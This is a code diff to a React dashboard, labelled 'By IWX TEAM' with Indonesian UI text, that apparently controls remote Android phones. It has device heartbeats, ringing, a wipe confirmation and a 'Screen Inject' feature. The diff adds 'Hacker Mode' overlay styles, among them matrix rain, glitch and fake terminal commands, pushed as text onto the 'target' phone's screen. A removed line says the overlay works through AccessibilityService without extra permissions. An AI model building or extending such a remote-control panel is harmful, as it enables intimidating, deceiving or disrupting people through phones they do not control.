@@ -84,8 +84,9 @@ export default function Dashboard() {
   const [isRinging, setIsRinging] = useState(false)
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
-  const [injectText, setInjectText]   = useState('By IWX TEAM')
-  const [isInjecting, setIsInjecting] = useState(false)
+  const [injectText, setInjectText]     = useState('By IWX TEAM')
+  const [injectStyle, setInjectStyle]   = useState('hacker')
+  const [isInjecting, setIsInjecting]   = useState(false)
   const [injectStatus, setInjectStatus] = useState('')
 
   const swrKey = selectedId ? `/api/device/heartbeat?deviceId=${encodeURIComponent(selectedId)}` : null
@@ -135,7 +136,7 @@ export default function Dashboard() {
       await fetch('/api/device/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject:' + text }),
+        body: JSON.stringify({ deviceId: selectedId, command: `screen_inject_${injectStyle}:${text}` }),
       })
       setInjectStatus('✅ Overlay tampil di layar HP')
     } catch { setInjectStatus('❌ Gagal kirim') }
@@ -510,45 +511,67 @@ export default function Dashboard() {
           {/* ── SCREEN INJECT ──────────────────────────────────────────────────── */}
           <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-3">
             <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
-              <Monitor size={13} /> Screen Inject
-              <span className="ml-auto text-[10px] font-normal text-android-muted normal-case">Tampilkan teks di layar HP target</span>
+              <Monitor size={13} className="text-android-green" />
+              <span className="text-android-green">Screen Inject</span>
+              <span className="ml-auto px-2 py-0.5 rounded text-[9px] font-bold bg-android-green/10 text-android-green border border-android-green/30 uppercase tracking-widest">Hacker Mode</span>
             </h3>
             {!connected ? (
               <p className="text-android-muted text-xs py-2 text-center">Hubungkan perangkat untuk menggunakan Screen Inject</p>
             ) : (
               <div className="space-y-3">
-                <div className="flex gap-2">
-                  <input
-                    type="text"
-                    value={injectText}
-                    onChange={e => setInjectText(e.target.value)}
-                    placeholder="By IWX TEAM"
-                    className="flex-1 bg-android-bg border border-android-border rounded-lg px-3 py-2 text-sm text-android-text font-mono placeholder:text-android-muted/50 focus:outline-none focus:border-android-green/60"
-                  />
+                {/* Custom text */}
+                <input
+                  type="text"
+                  value={injectText}
+                  onChange={e => setInjectText(e.target.value)}
+                  placeholder="By IWX TEAM"
+                  className="w-full bg-android-bg border border-android-green/30 rounded-lg px-3 py-2.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/80"
+                />
+                {/* Style selector */}
+                <div className="grid grid-cols-4 gap-1.5">
+                  {([
+                    { id:'hacker',   label:'⚡ Hacker',   desc:'Matrix+Glitch' },
+                    { id:'matrix',   label:'🌧 Matrix',   desc:'Rain only'     },
+                    { id:'terminal', label:'💻 Terminal', desc:'Fake cmds'     },
+                    { id:'glitch',   label:'📡 Glitch',   desc:'Distort'       },
+                  ] as const).map(s=>(
+                    <button
+                      key={s.id}
+                      onClick={()=>setInjectStyle(s.id)}
+                      className={`flex flex-col items-center py-2 px-1 rounded-lg border text-center transition-all ${
+                        injectStyle===s.id
+                          ? 'bg-android-green/15 border-android-green text-android-green'
+                          : 'bg-android-bg border-android-border text-android-muted hover:border-android-green/40'
+                      }`}
+                    >
+                      <span className="text-xs font-bold">{s.label}</span>
+                      <span className="text-[9px] opacity-60 mt-0.5">{s.desc}</span>
+                    </button>
+                  ))}
                 </div>
+                {/* Action buttons */}
                 <div className="flex gap-2">
                   <button
                     onClick={handleInject}
                     disabled={ctrlBusy}
-                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 transition-colors disabled:opacity-50"
+                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-bold bg-android-green/10 border border-android-green/50 text-android-green hover:bg-android-green/20 active:scale-95 transition-all disabled:opacity-50"
                   >
                     <Monitor size={15} />
-                    Inject ke Layar
+                    INJECT
                   </button>
                   <button
                     onClick={handleInjectStop}
                     disabled={ctrlBusy}
-                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20 transition-colors disabled:opacity-50"
+                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-bold bg-android-red/10 border border-android-red/40 text-android-red hover:bg-android-red/20 active:scale-95 transition-all disabled:opacity-50"
                   >
-                    Stop
+                    ✕ STOP
                   </button>
                 </div>
                 {injectStatus && (
-                  <p className="text-xs text-android-muted font-mono text-center">{injectStatus}</p>
+                  <div className="bg-android-bg border border-android-green/20 rounded-lg px-3 py-2">
+                    <p className="text-xs text-android-green font-mono text-center">{injectStatus}</p>
+                  </div>
                 )}
-                <p className="text-[10px] text-android-muted/60 text-center">
-                  Muncul di layar HP via AccessibilityService — tidak perlu permission tambahan
-                </p>
               </div>
             )}
           </div>
